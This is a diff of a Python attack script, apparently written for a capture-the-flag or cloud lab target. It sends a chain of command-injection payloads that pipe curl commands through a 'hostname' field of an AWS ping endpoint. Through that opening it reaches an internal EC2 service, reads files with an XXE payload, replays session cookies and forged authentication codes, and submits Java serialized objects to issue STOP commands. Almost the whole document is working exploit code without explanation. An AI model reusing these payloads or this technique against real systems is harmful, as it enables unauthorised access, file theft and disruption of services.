@@ -29,14 +29,14 @@ payload_09 = {"hostname":"google.com | curl -H 'Cookie:JSESSIONID=ZZZZZZZZZZ' 'h
 payload_10 = {"hostname":"google.com | curl 'http://ip-172-31-31-95.ec2.internal:8080/commandproc/LoginDocument' -H 'Content-Type: multipart/form-data; boundary=----123' --data-binary '------123\r\nContent-Disposition: form-data; name=\"document\"\r\n\r\n<?xml version=\"1.0\"?><!DOCTYPE svg [ <!ENTITY xxe SYSTEM \"/tmp/aaa.enc\">]><credentials><user>&xxe;</user><password></password></credentials>\r\n------123--\r\n' -i -L"}
 payload_11 = {"hostname":"google.com | curl http://ip-172-31-31-95.ec2.internal:8080/commandproc/GetCommand -H 'Cookie:JSESSIONID=ZZZZZZZZZZ' -F authCode=YYYYYYYYYY -F type=STOP -F target= -F argument= "}
 payload_12 = {"hostname":"google.com | curl http://ip-172-31-31-95.ec2.internal:8080/commandproc/GetCommand -F authCode=YYYYYYYYYY -F type=STOP -F target= -F argument= "}
-payload_13 = {"hostname":"google.com | curl http://ip-172-31-31-95.ec2.internal:8080/commandproc/GetCommand -F authCode=YYYYYYYYYY -F type=STOP -F target= -F argument= "}
-payload_135 = {"hostname":"google.com | curl http://ip-172-31-31-95.ec2.internal:8080/commandproc/GetCommand -F authCode=YYYYYYYYYY -F type=STOP -F target= -F argument= "}
+#payload_13 = {"hostname":"google.com | curl http://ip-172-31-31-95.ec2.internal:8080/commandproc/GetCommand -F authCode=YYYYYYYYYY -F type=STOP -F target= -F argument= "}
+#payload_135 = {"hostname":"google.com | curl http://ip-172-31-31-95.ec2.internal:8080/commandproc/GetCommand -F authCode=YYYYYYYYYY -F type=STOP -F target= -F argument= "}
 
 
-payload_14 = {"hostname":"google.com | curl 'http://ip-172-31-31-95.ec2.internal:8080/commandproc/SubmitCommand' -H 'Content-Type: multipart/form-data; boundary=----123' --data-binary '------123\r\nContent-Disposition: form-data; name=\"object\"\r\n\r\nYYYYYYYYYY\r\n------123--\r\n' -i -L"}
+#payload_14 = {"hostname":"google.com | curl 'http://ip-172-31-31-95.ec2.internal:8080/commandproc/SubmitCommand' -H 'Content-Type: multipart/form-data; boundary=----123' --data-binary '------123\r\nContent-Disposition: form-data; name=\"object\"\r\n\r\nYYYYYYYYYY\r\n------123--\r\n' -i -L"}
 
-payload_15 = {"hostname":"google.com | curl -H 'Cookie:ZZZZZZZZZZ' 'http://ip-172-31-31-95.ec2.internal:8080/commandproc/SubmitCommand' -H 'Content-Type: multipart/form-data; boundary=----123' --data-binary '------123\r\nContent-Disposition: form-data; name=\"object\"\r\n\r\nYYYYYYYYYY\r\n------123--\r\n' -L"}
-payload_16 = {"hostname":"google.com | curl -H 'Cookie:ZZZZZZZZZZ' 'http://ip-172-31-31-95.ec2.internal:8080/commandproc/SubmitCommand' -H 'Content-Type: multipart/form-data; boundary=----123' --data-binary '------123\r\nContent-Disposition: form-data; name=\"object\"\r\n\r\nYYYYYYYYYY\r\n------123--\r\n' -L"}
+payload_15 = {"hostname":"google.com | curl -H 'Cookie:JSESSIONID=ZZZZZZZZZZ' 'http://ip-172-31-31-95.ec2.internal:8080/commandproc/SubmitCommand' -H 'Content-Type: multipart/form-data; boundary=----123' --data-binary '------123\r\nContent-Disposition: form-data; name=\"object\"\r\n\r\nYYYYYYYYYY\r\n------123--\r\n' -L"}
+#payload_16 = {"hostname":"google.com | curl -H 'Cookie:JSESSIONID=ZZZZZZZZZZ' 'http://ip-172-31-31-95.ec2.internal:8080/commandproc/SubmitCommand' -H 'Content-Type: multipart/form-data; boundary=----123' --data-binary '------123\r\nContent-Disposition: form-data; name=\"object\"\r\n\r\nYYYYYYYYYY\r\n------123--\r\n' -L"}
 
 def rockman():
     print("========== payload 01 login ==========")
@@ -127,7 +127,7 @@ def rockman():
 
     print("========== payload 06 ==========")
     print(payload_06)
-    payload_06["hostname"] = payload_06["hostname"].replace("ZZZZZZZZZZ", sessionid04)
+    payload_06["hostname"] = payload_06["hostname"].replace("ZZZZZZZZZZ", sessionid01)
     r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_06, headers=headers)
     print(r.status_code)
     print(r.text)
@@ -150,14 +150,14 @@ def rockman():
 
     print("========== payload 08 ==========")
     print(payload_08)
-    payload_08["hostname"] = payload_08["hostname"].replace("ZZZZZZZZZZ", sessionid04)
+    payload_08["hostname"] = payload_08["hostname"].replace("ZZZZZZZZZZ", sessionid01)
     r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_08, headers=headers)
     print(r.status_code)
     print(r.text)
 
     print("========== payload 09 ==========")
     print(payload_09)
-    payload_09["hostname"] = payload_09["hostname"].replace("ZZZZZZZZZZ", sessionid04)
+    payload_09["hostname"] = payload_09["hostname"].replace("ZZZZZZZZZZ", sessionid01)
     r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_09, headers=headers)
     print(r.status_code)
     print(r.text)
@@ -165,7 +165,7 @@ def rockman():
     #get etc/commandauth.bin content
     print("========== payload 10 ==========")
     print(payload_10)
-    payload_10["hostname"] = payload_10["hostname"].replace("ZZZZZZZZZZ", sessionid04)
+    payload_10["hostname"] = payload_10["hostname"].replace("ZZZZZZZZZZ", sessionid01)
     r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_10, headers=headers)
     print(r.status_code)
     print(r.text)
@@ -183,7 +183,7 @@ def rockman():
     print("========== payload 11 ==========")
     authcode = "rn2Qwyc6M4yw0C59ViH610mJqTmRusIGFzEqfVKpoIwUApFwrzpyAV0C5ehi8xI8\nOv5/wPdpu9BDQO9iNa9Nb5VZgOPO2ieunGDd2pOFdo+65ADhaAb9EIlbhsAuQ/Yh\nKXSTenBBGfgccNdkW/sZ5S7LeVhpMW9XFkx08PKLBIeimpVPPJQyMWn13HK0Vixe\n6dIs1L0DPwnj9wkuUtgP25U1lop2hE2yHu5yUsWSWiOesCh3UR9jNWg2G9f7em94\nF0w9Qls9xTQhkh2Ni1WRQYoqFUOuAA9fj2Lm9ITx4/i2VFIx7Bptx6cBkfa8aDUV\n1JZoKNni+goINz1b1E9o8w=="
     print(payload_11)
-    payload_11["hostname"] = payload_11["hostname"].replace("ZZZZZZZZZZ", sessionid04)
+    payload_11["hostname"] = payload_11["hostname"].replace("ZZZZZZZZZZ", sessionid01)
     payload_11["hostname"] = payload_11["hostname"].replace("YYYYYYYYYY", authcode)
     r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_11, headers=headers)
     print(r.status_code)
@@ -192,7 +192,7 @@ def rockman():
     print("========== payload 12 ==========")
     authcode = "rn2Qwyc6M4yw0C59ViH610mJqTmRusIGFzEqfVKpoIwUApFwrzpyAV0C5ehi8xI8Ov5/wPdpu9BDQO9iNa9Nb5VZgOPO2ieunGDd2pOFdo+65ADhaAb9EIlbhsAuQ/YhKXSTenBBGfgccNdkW/sZ5S7LeVhpMW9XFkx08PKLBIeimpVPPJQyMWn13HK0Vixe6dIs1L0DPwnj9wkuUtgP25U1lop2hE2yHu5yUsWSWiOesCh3UR9jNWg2G9f7em94F0w9Qls9xTQhkh2Ni1WRQYoqFUOuAA9fj2Lm9ITx4/i2VFIx7Bptx6cBkfa8aDUV1JZoKNni+goINz1b1E9o8w=="
     print(payload_12)
-    payload_12["hostname"] = payload_12["hostname"].replace("ZZZZZZZZZZ", sessionid04)
+    payload_12["hostname"] = payload_12["hostname"].replace("ZZZZZZZZZZ", sessionid01)
     payload_12["hostname"] = payload_12["hostname"].replace("YYYYYYYYYY", authcode)
     #print(payload_12)
     r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_12, headers=headers)
@@ -200,64 +200,47 @@ def rockman():
     print(r.text)
 
 
-    print("========== payload 13 =======ERIC TEST ===")
-    authcode = "rn2Qwyc6M4yw0C59ViH610mJqTmRusIGFzEqfVKpoIwUApFwrzpyAV0C5ehi8xI8Ov5/wPdpu9BDQO9iNa9Nb5VZgOPO2ieunGDd2pOFdo+65ADhaAb9EIlbhsAuQ/YhKXSTenBBGfgccNdkW/sZ5S7LeVhpMW9XFkx08PKLBIeimpVPPJQyMWn13HK0Vixe6dIs1L0DPwnj9wkuUtgP25U1lop2hE2yHu5yUsWSWiOesCh3UR9jNWg2G9f7em94F0w9Qls9xTQhkh2Ni1WRQYoqFUOuAA9fj2Lm9ITx4/i2VFIx7Bptx6cBkfa8aDUV1JZoKNni+goINz1b1E9o8w=="
-    print(payload_13)
-    payload_13["hostname"] = payload_13["hostname"].replace("ZZZZZZZZZZ", sessionid04)
-    payload_13["hostname"] = payload_13["hostname"].replace("YYYYYYYYYY", authcode)
-    print(payload_13)
-    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_13, headers=headers)
-    print(r.status_code)
-    print(r.text)
+    #print("========== payload 13 =======ERIC TEST ===")
+    #authcode = "rn2Qwyc6M4yw0C59ViH610mJqTmRusIGFzEqfVKpoIwUApFwrzpyAV0C5ehi8xI8Ov5/wPdpu9BDQO9iNa9Nb5VZgOPO2ieunGDd2pOFdo+65ADhaAb9EIlbhsAuQ/YhKXSTenBBGfgccNdkW/sZ5S7LeVhpMW9XFkx08PKLBIeimpVPPJQyMWn13HK0Vixe6dIs1L0DPwnj9wkuUtgP25U1lop2hE2yHu5yUsWSWiOesCh3UR9jNWg2G9f7em94F0w9Qls9xTQhkh2Ni1WRQYoqFUOuAA9fj2Lm9ITx4/i2VFIx7Bptx6cBkfa8aDUV1JZoKNni+goINz1b1E9o8w=="
+    #print(payload_13)
+    #payload_13["hostname"] = payload_13["hostname"].replace("ZZZZZZZZZZ", sessionid01)
+    #payload_13["hostname"] = payload_13["hostname"].replace("YYYYYYYYYY", authcode)
+    #print(payload_13)
+    #r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_13, headers=headers)
+    #print(r.status_code)
+    #print(r.text)
 
 
-    print("========== payload 13.5 =======Yi shan said use authcode play again ===")
-    authcode = "rO0ABXNyAA5zZXJpYWwuQ29tbWFuZIJYpr6zsellAgAETAAIYXJndW1lbnR0ABJMamF2YS9sYW5nL1N0cmluZztbAAhhdXRoQ29kZXQAAltCTAAGdGFyZ2V0cQB+AAFMAAR0eXBldAAUTHNlcmlhbC9Db21tYW5kVHlwZTt4cHQAAHVyAAJbQqzzF/gGCFTgAgAAeHAAAAEArn2Qwyc6M4yw0C59ViH610mJqTmRusIGFzEqfVKpoIwUApFwrzpyAV0C5ehi8xI8Ov5/wPdpu9BDQO9iNa9Nb5VZgOPO2ieunGDd2pOFdo+65ADhaAb9EIlbhsAuQ/YhKXSTenBBGfgccNdkW/sZ5S7LeVhpMW9XFkx08PKLBIeimpVPPJQyMWn13HK0Vixe6dIs1L0DPwnj9wkuUtgP25U1lop2hE2yHu5yUsWSWiOesCh3UR9jNWg2G9f7em94F0w9Qls9xTQhkh2Ni1WRQYoqFUOuAA9fj2Lm9ITx4/i2VFIx7Bptx6cBkfa8aDUV1JZoKNni+goINz1b1E9o83QAAH5yABJzZXJpYWwuQ29tbWFuZFR5cGUAAAAAAAAAABIAAHhyAA5qYXZhLmxhbmcuRW51bQAAAAAAAAAAEgAAeHB0AARTVE9Q"
-    print(payload_135)
-    payload_135["hostname"] = payload_135["hostname"].replace("ZZZZZZZZZZ", sessionid04)
-    payload_135["hostname"] = payload_135["hostname"].replace("YYYYYYYYYY", authcode)
-    print(payload_135)
-    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_135, headers=headers)
-    print(r.status_code)
-    print(r.text)
+    #print("========== payload 13.5 =======Yi shan said use authcode play again ===")
+    #authcode = "rO0ABXNyAA5zZXJpYWwuQ29tbWFuZIJYpr6zsellAgAETAAIYXJndW1lbnR0ABJMamF2YS9sYW5nL1N0cmluZztbAAhhdXRoQ29kZXQAAltCTAAGdGFyZ2V0cQB+AAFMAAR0eXBldAAUTHNlcmlhbC9Db21tYW5kVHlwZTt4cHQAAHVyAAJbQqzzF/gGCFTgAgAAeHAAAAEArn2Qwyc6M4yw0C59ViH610mJqTmRusIGFzEqfVKpoIwUApFwrzpyAV0C5ehi8xI8Ov5/wPdpu9BDQO9iNa9Nb5VZgOPO2ieunGDd2pOFdo+65ADhaAb9EIlbhsAuQ/YhKXSTenBBGfgccNdkW/sZ5S7LeVhpMW9XFkx08PKLBIeimpVPPJQyMWn13HK0Vixe6dIs1L0DPwnj9wkuUtgP25U1lop2hE2yHu5yUsWSWiOesCh3UR9jNWg2G9f7em94F0w9Qls9xTQhkh2Ni1WRQYoqFUOuAA9fj2Lm9ITx4/i2VFIx7Bptx6cBkfa8aDUV1JZoKNni+goINz1b1E9o83QAAH5yABJzZXJpYWwuQ29tbWFuZFR5cGUAAAAAAAAAABIAAHhyAA5qYXZhLmxhbmcuRW51bQAAAAAAAAAAEgAAeHB0AARTVE9Q"
+    #print(payload_135)
+    #payload_135["hostname"] = payload_135["hostname"].replace("ZZZZZZZZZZ", sessionid01)
+    #payload_135["hostname"] = payload_135["hostname"].replace("YYYYYYYYYY", authcode)
+    #print(payload_135)
+    #r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_135, headers=headers)
+    #print(r.status_code)
+    #print(r.text)
 
-    print("========== payload 14 ==========")
-    finalauthcode = "rO0ABXNyAA5zZXJpYWwuQ29tbWFuZIJYpr6zsellAgAETAAIYXJndW1lbnR0ABJMamF2YS9sYW5nL1N0cmluZztbAAhhdXRoQ29kZXQAAltCTAAGdGFyZ2V0cQB+AAFMAAR0eXBldAAUTHNlcmlhbC9Db21tYW5kVHlwZTt4cHQAAHVyAAJbQqzzF/gGCFTgAgAAeHAAAAHjrO0ABXNyAA5zZXJpYWwuQ29tbWFuZIJYpr6zsellAgAETAAIYXJndW1lbnR0ABJMamF2YS9sYW5nL1N0cmluZztbAAhhdXRoQ29kZXQAAltCTAAGdGFyZ2V0cQB+AAFMAAR0eXBldAAUTHNlcmlhbC9Db21tYW5kVHlwZTt4cHQAAHVyAAJbQqzzF/gGCFTgAgAAeHAAAAEArn2Qwyc6M4yw0C59ViH610mJqTmRusIGFzEqfVKpoIwUApFwrzpyAV0C5ehi8xI8Ov5/wPdpu9BDQO9iNa9Nb5VZgOPO2ieunGDd2pOFdo+65ADhaAb9EIlbhsAuQ/YhKXSTenBBGfgccNdkW/sZ5S7LeVhpMW9XFkx08PKLBIeimpVPPJQyMWn13HK0Vixe6dIs1L0DPwnj9wkuUtgP25U1lop2hE2yHu5yUsWSWiOesCh3UR9jNWg2G9f7em94F0w9Qls9xTQhkh2Ni1WRQYoqFUOuAA9fj2Lm9ITx4/i2VFIx7Bptx6cBkfa8aDUV1JZoKNni+goINz1b1E9o83QAAH5yABJzZXJpYWwuQ29tbWFuZFR5cGUAAAAAAAAAABIAAHhyAA5qYXZhLmxhbmcuRW51bQAAAAAAAAAAEgAAeHB0AARTVE9QdAAAfnIAEnNlcmlhbC5Db21tYW5kVHlwZQAAAAAAAAAAEgAAeHIADmphdmEubGFuZy5FbnVtAAAAAAAAAAASAAB4cHQABFNUT1A="
-    print(payload_14)
-    payload_14["hostname"] = payload_14["hostname"].replace("ZZZZZZZZZZ", sessionid04)
-    payload_14["hostname"] = payload_14["hostname"].replace("YYYYYYYYYY", finalauthcode)
-    print(payload_14)
-    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_14, headers=headers)
-    print(r.status_code)
-    print(r.text)
+    #print("========== payload 14 ==========")
+    #finalauthcode = "rO0ABXNyAA5zZXJpYWwuQ29tbWFuZIJYpr6zsellAgAETAAIYXJndW1lbnR0ABJMamF2YS9sYW5nL1N0cmluZztbAAhhdXRoQ29kZXQAAltCTAAGdGFyZ2V0cQB+AAFMAAR0eXBldAAUTHNlcmlhbC9Db21tYW5kVHlwZTt4cHQAAHVyAAJbQqzzF/gGCFTgAgAAeHAAAAHjrO0ABXNyAA5zZXJpYWwuQ29tbWFuZIJYpr6zsellAgAETAAIYXJndW1lbnR0ABJMamF2YS9sYW5nL1N0cmluZztbAAhhdXRoQ29kZXQAAltCTAAGdGFyZ2V0cQB+AAFMAAR0eXBldAAUTHNlcmlhbC9Db21tYW5kVHlwZTt4cHQAAHVyAAJbQqzzF/gGCFTgAgAAeHAAAAEArn2Qwyc6M4yw0C59ViH610mJqTmRusIGFzEqfVKpoIwUApFwrzpyAV0C5ehi8xI8Ov5/wPdpu9BDQO9iNa9Nb5VZgOPO2ieunGDd2pOFdo+65ADhaAb9EIlbhsAuQ/YhKXSTenBBGfgccNdkW/sZ5S7LeVhpMW9XFkx08PKLBIeimpVPPJQyMWn13HK0Vixe6dIs1L0DPwnj9wkuUtgP25U1lop2hE2yHu5yUsWSWiOesCh3UR9jNWg2G9f7em94F0w9Qls9xTQhkh2Ni1WRQYoqFUOuAA9fj2Lm9ITx4/i2VFIx7Bptx6cBkfa8aDUV1JZoKNni+goINz1b1E9o83QAAH5yABJzZXJpYWwuQ29tbWFuZFR5cGUAAAAAAAAAABIAAHhyAA5qYXZhLmxhbmcuRW51bQAAAAAAAAAAEgAAeHB0AARTVE9QdAAAfnIAEnNlcmlhbC5Db21tYW5kVHlwZQAAAAAAAAAAEgAAeHIADmphdmEubGFuZy5FbnVtAAAAAAAAAAASAAB4cHQABFNUT1A="
+    #print(payload_14)
+    #payload_14["hostname"] = payload_14["hostname"].replace("ZZZZZZZZZZ", sessionid01)
+    #payload_14["hostname"] = payload_14["hostname"].replace("YYYYYYYYYY", finalauthcode)
+    #print(payload_14)
+    #r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_14, headers=headers)
+    #print(r.status_code)
+    #print(r.text)
 
     print("========== payload 15 ==========")
     finalauthcode = "rO0ABXNyAA5zZXJpYWwuQ29tbWFuZIJYpr6zsellAgAETAAIYXJndW1lbnR0ABJMamF2YS9sYW5nL1N0cmluZztbAAhhdXRoQ29kZXQAAltCTAAGdGFyZ2V0cQB+AAFMAAR0eXBldAAUTHNlcmlhbC9Db21tYW5kVHlwZTt4cHQAAHVyAAJbQqzzF/gGCFTgAgAAeHAAAAEArn2Qwyc6M4yw0C59ViH610mJqTmRusIGFzEqfVKpoIwUApFwrzpyAV0C5ehi8xI8Ov5/wPdpu9BDQO9iNa9Nb5VZgOPO2ieunGDd2pOFdo+65ADhaAb9EIlbhsAuQ/YhKXSTenBBGfgccNdkW/sZ5S7LeVhpMW9XFkx08PKLBIeimpVPPJQyMWn13HK0Vixe6dIs1L0DPwnj9wkuUtgP25U1lop2hE2yHu5yUsWSWiOesCh3UR9jNWg2G9f7em94F0w9Qls9xTQhkh2Ni1WRQYoqFUOuAA9fj2Lm9ITx4/i2VFIx7Bptx6cBkfa8aDUV1JZoKNni+goINz1b1E9o83QAAH5yABJzZXJpYWwuQ29tbWFuZFR5cGUAAAAAAAAAABIAAHhyAA5qYXZhLmxhbmcuRW51bQAAAAAAAAAAEgAAeHB0AARTVE9Q"
     print(payload_15)
-    payload_15["hostname"] = payload_15["hostname"].replace("ZZZZZZZZZZ", sessionid04)
+    payload_15["hostname"] = payload_15["hostname"].replace("ZZZZZZZZZZ", sessionid01)
     payload_15["hostname"] = payload_15["hostname"].replace("YYYYYYYYYY", finalauthcode)
     print(payload_15)
     r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_15, headers=headers)
     print(r.status_code)
     print(r.text)
 
-    print("========== payload 16 ==========")
-    finalauthcode = "rO0ABXNyAA5zZXJpYWwuQ29tbWFuZIJYpr6zsellAgAETAAIYXJndW1lbnR0ABJMamF2YS9sYW5nL1N0cmluZztbAAhhdXRoQ29kZXQAAltCTAAGdGFyZ2V0cQB+AAFMAAR0eXBldAAUTHNlcmlhbC9Db21tYW5kVHlwZTt4cHQAAHVyAAJbQqzzF/gGCFTgAgAAeHAAAAHjrO0ABXNyAA5zZXJpYWwuQ29tbWFuZIJYpr6zsellAgAETAAIYXJndW1lbnR0ABJMamF2YS9sYW5nL1N0cmluZztbAAhhdXRoQ29kZXQAAltCTAAGdGFyZ2V0cQB+AAFMAAR0eXBldAAUTHNlcmlhbC9Db21tYW5kVHlwZTt4cHQAAHVyAAJbQqzzF/gGCFTgAgAAeHAAAAEArn2Qwyc6M4yw0C59ViH610mJqTmRusIGFzEqfVKpoIwUApFwrzpyAV0C5ehi8xI8Ov5/wPdpu9BDQO9iNa9Nb5VZgOPO2ieunGDd2pOFdo+65ADhaAb9EIlbhsAuQ/YhKXSTenBBGfgccNdkW/sZ5S7LeVhpMW9XFkx08PKLBIeimpVPPJQyMWn13HK0Vixe6dIs1L0DPwnj9wkuUtgP25U1lop2hE2yHu5yUsWSWiOesCh3UR9jNWg2G9f7em94F0w9Qls9xTQhkh2Ni1WRQYoqFUOuAA9fj2Lm9ITx4/i2VFIx7Bptx6cBkfa8aDUV1JZoKNni+goINz1b1E9o83QAAH5yABJzZXJpYWwuQ29tbWFuZFR5cGUAAAAAAAAAABIAAHhyAA5qYXZhLmxhbmcuRW51bQAAAAAAAAAAEgAAeHB0AARTVE9QdAAAfnIAEnNlcmlhbC5Db21tYW5kVHlwZQAAAAAAAAAAEgAAeHIADmphdmEubGFuZy5FbnVtAAAAAAAAAAASAAB4cHQABFNUT1A="
-    payload_16["hostname"] = payload_16["hostname"].replace("ZZZZZZZZZZ", sessionid04)
-    payload_16["hostname"] = payload_16["hostname"].replace("YYYYYYYYYY", finalauthcode)
-    print(payload_16)
-    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_16, headers=headers)
-    print(r.status_code)
-    print(r.text)
-
-
-
-    #print("========== payload 05 ==========")
-    #print(payload_05)
-    #payload_05["hostname"] = payload_05["hostname"].replace("ZZZZZZZZZZ", sessionid03)
-    #r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_05, headers=headers)
-    #print(r.status_code)
-    #print(r.text)
 
 
     htmlwirter(r.text)
